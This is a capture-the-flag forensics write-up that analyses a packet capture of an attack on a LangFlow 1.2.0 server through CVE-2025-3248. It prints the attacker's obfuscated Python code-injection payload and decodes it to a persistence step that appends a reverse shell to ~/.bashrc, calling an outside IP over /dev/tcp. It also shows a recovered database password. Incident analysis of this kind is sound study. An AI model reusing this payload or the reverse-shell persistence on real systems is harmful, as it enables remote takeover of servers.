# Watchtower Of Mists

Flag 1: What is the LangFlow version in use? (e.g. 1.5.7)

```shell
$ strings capture.pcap | grep version
GET /api/v1/version HTTP/1.1
9{"version":"1.2.0","main_version":"1.2.0","package":"Langflow"}
```

Flag 2: What is the CVE assigned to this LangFlow vulnerability? (e.g. CVE-2025-12345)

Google for `langflow 1.2.0 cve` leads to [CVE-2025-3248](https://nvd.nist.gov/vuln/detail/CVE-2025-3248)

Flag 3: What is the name of the API endpoint exploited by the attacker to execute commands on the system? (e.g. /api/v1/health)

In [CVE-2025-3248](https://nvd.nist.gov/vuln/detail/CVE-2025-3248), the vulnerable endpoint is `/api/v1/validate/code`.

Flag 4: What is the IP address of the attacker? (format: x.x.x.x)

In Wireshark, filter by http, we find the source IP address of HTTP requests: `188.114.96.12`.

Flag 5: The attacker used a persistence technique, what is the port used by the reverse shell? (e.g. 4444)

In the posted body, there is a Python code:

```python
def run(cd=exec(__import__('zlib').decompress(__import__('base64').b64decode('eJwNyE0LgjAYAOC/MnZSKguNqIOCpAdDK8IIT0Pnyza1JvsIi+i313N8VC00oHSiMBohHw4h4j5KZQhxsLbNqCQFrbHrUQ60J9Ka0RoHA+USUZ+x/Nazs6hY7l+GVuxWVRA/i7KY8i62x3dmi/02OCXXV5bEs0OXhp+m1rBZo8WiBSpbQFGEvkvvv1xRPEeawzCEpbLguj8DMjVN')).decode())): pass
```

Dump the generated code:

```python
>>> (__import__('zlib').decompress(__import__('base64').b64decode('eJwNyE0LgjAYAOC/MnZSKguNqIOCpAdDK8IIT0Pnyza1JvsIi+i313N8VC00oHSiMBohHw4h4j5KZQhxsLbNqCQFrbHrUQ\
60J9Ka0RoHA+USUZ+x/Nazs6hY7l+GVuxWVRA/i7KY8i62x3dmi/02OCXXV5bEs0OXhp+m1rBZo8WiBSpbQFGEvkvvv1xRPEeawzCEpbLguj8DMjVN')).decode())
'raise Exception(__import__("subprocess").check_output("echo c2ggLWkgPiYgL2Rldi90Y3AvMTMxLjAuNzIuMC83ODUyIDA+JjE=|base64 --decode >> ~/.bashrc", shell=True))'
```

Decode:

```shell
$ echo c2ggLWkgPiYgL2Rldi90Y3AvMTMxLjAuNzIuMC83ODUyIDA+JjE=|base64 --decode
sh -i >& /dev/tcp/131.0.72.0/7852 0>&1
```

Flag 6: What is the system machine hostname? (e.g. server01)

In `strings capture.pcap | grep HOSTNAME=`, we find `HOSTNAME=aisrv01` in output.

Flag 7: What is the Postgres password used by LangFlow? (e.g. Password123)

In `strings capture.pcap | grep postgres`, find `LANGFLOW_DATABASE_URL=postgresql://langflow:LnGFlWPassword2025@postgres:5432/langflow` in output.
